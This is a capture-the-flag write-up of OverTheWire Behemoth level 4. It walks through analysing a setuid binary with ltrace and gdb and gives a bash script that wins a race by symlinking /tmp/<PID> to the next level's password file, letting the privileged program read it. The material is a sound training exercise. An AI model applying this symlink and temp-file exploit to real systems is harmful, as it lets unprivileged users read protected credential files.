---
layout: post
title: OverTheWire - Behemoth 4
---

Site: http://overthewire.org/wargames/behemoth/ <br>
Level: 4 <br>
Situation: Arbitrary Command Execution Vuln?<br><br>

This although was simple still required a little bit of data collection. 

We begin as usual lets create our tmp folder, find the arch type of the file, and run it to see what its default behavior is.

{% highlight bash %}
behemoth4@melinda:~$ mkdir /tmp/bh4
behemoth4@melinda:~$ cd /tmp/bh4
behemoth4@melinda:/tmp/bh4$
{% endhighlight %}
{% highlight bash %}
behemoth4@melinda:/tmp/bh4$ file /behemoth/behemoth4
/behemoth/behemoth4: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=18d1a5b6fa5fce1e82e9abde67ce0e88766ace32, not stripped
{% endhighlight %}
{% highlight bash %}
behemoth4@melinda:/tmp/bh4$ /behemoth/behemoth4
PID not found!
{% endhighlight %}

We can see we aren’t going to get the full program execution. Before we open it in gdb lets go ahead and dump the global offset table and ltrace the execution.

{% highlight bash %}
behemoth4@melinda:~$ objdump -R /behemoth/behemoth4

/behemoth/behemoth4:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a00c R_386_JUMP_SLOT   fclose
0804a010 R_386_JUMP_SLOT   sleep
0804a014 R_386_JUMP_SLOT   __stack_chk_fail
0804a018 R_386_JUMP_SLOT   getpid
0804a01c R_386_JUMP_SLOT   puts
0804a020 R_386_JUMP_SLOT   __gmon_start__
0804a024 R_386_JUMP_SLOT   __libc_start_main
0804a028 R_386_JUMP_SLOT   fopen
0804a02c R_386_JUMP_SLOT   putchar
0804a030 R_386_JUMP_SLOT   fgetc
0804a034 R_386_JUMP_SLOT   sprintf
{% endhighlight %}
{% highlight bash %}
behemoth4@melinda:~$ ltrace /behemoth/behemoth4
__libc_start_main(0x80485dd, 1, 0xffffd784, 0x80486b0 <unfinished ...>
getpid()                                           = 8197
sprintf("/tmp/8197", "/tmp/%d", 8197)              = 9
fopen("/tmp/8197", "r")                            = 0
puts("PID not found!"PID not found!
)                             = 15
+++ exited (status 0) +++
{% endhighlight %}

We can tell that a file is trying to be opened and when it is not the application exists out. We run it again to see if it’s the same file.

{% highlight bash %}
behemoth4@melinda:~$ ltrace /behemoth/behemoth4
__libc_start_main(0x80485dd, 1, 0xffffd784, 0x80486b0 <unfinished ...>
getpid()                                           = 9265
sprintf("/tmp/9265", "/tmp/%d", 9265)              = 9
fopen("/tmp/9265", "r")                            = 0
puts("PID not found!"PID not found!
)                             = 15
+++ exited (status 0) +++
{% endhighlight %}

Looking at this we can see it isn't the same. We can also tell that the file it’s checking for is the process id of the application itself. We now open it in GDB to pause the application to add the file and see what happens. We will break on the fopen to get the file location.

{% highlight bash %}
behemoth4@melinda:/tmp/bh4$ gdb /behemoth/behemoth4

(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:

-- SNIP --
   0x08048626 <+73>:	call   0x80484a0 <fopen@plt>
   0x0804862b <+78>:	mov    DWORD PTR [esp+0x20],eax
   0x0804862f <+82>:	cmp    DWORD PTR [esp+0x20],0x0
   0x08048634 <+87>:	jne    0x8048644 <main+103>
   0x08048636 <+89>:	mov    DWORD PTR [esp],0x804874a
   0x0804863d <+96>:	call   0x8048470 <puts@plt>
   0x08048642 <+101>:	jmp    0x804868d <main+176>
-- SNIP --

-- SNIP -- 
   0x08048671 <+148>:	call   0x80484c0 <fgetc@plt>
   0x08048676 <+153>:	mov    DWORD PTR [esp+0x24],eax
   0x0804867a <+157>:	cmp    DWORD PTR [esp+0x24],0xffffffff
   0x0804867f <+162>:	jne    0x804865e <main+129>
   0x08048681 <+164>:	mov    eax,DWORD PTR [esp+0x20]
   0x08048685 <+168>:	mov    DWORD PTR [esp],eax
   0x08048688 <+171>:	call   0x8048430 <fclose@plt>
-- SNIP --

End of assembler dump.
(gdb) break *0x08048626

{% endhighlight %}

From what we know fgetc is used to get characters from a file.
So we will include some data for testing sake.

{% highlight bash %}
behemoth4@melinda:~$ echo "a" > /tmp/10857
{% endhighlight %}

{% highlight bash %}
(gdb) continue
Continuing.
a
Finished sleeping, fgetcing
[Inferior 1 (process 10857) exited normally]
{% endhighlight %}

Interestingly enough it seems to also show us the file contents. Now we know we can use a symlink to link to the password file and in theory will be able to utilize this to read the password file. However in order to do that we will create the file after the application is ran. To do this we will create a simple bash script utilizing the kill command to pause execution of the application long enough for the script to create the symlink.

{% highlight bash %}
#runit.sh
/behemoth/behemoth4&
PID=$!
kill -STOP $PID
ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID
kill -CONT $PID
echo $PID
{% endhighlight %}

Now we give it execution permissions and run the application.

{% highlight bash %}
behemoth4@melinda:/tmp/bh4$ chmod +x runit.sh
behemoth4@melinda:/tmp/bh4$ ./runit.sh 
12421
behemoth4@melinda:/tmp/bh4$ Finished sleeping, fgetcing
[OMITTED]
{% endhighlight %}

There is our password.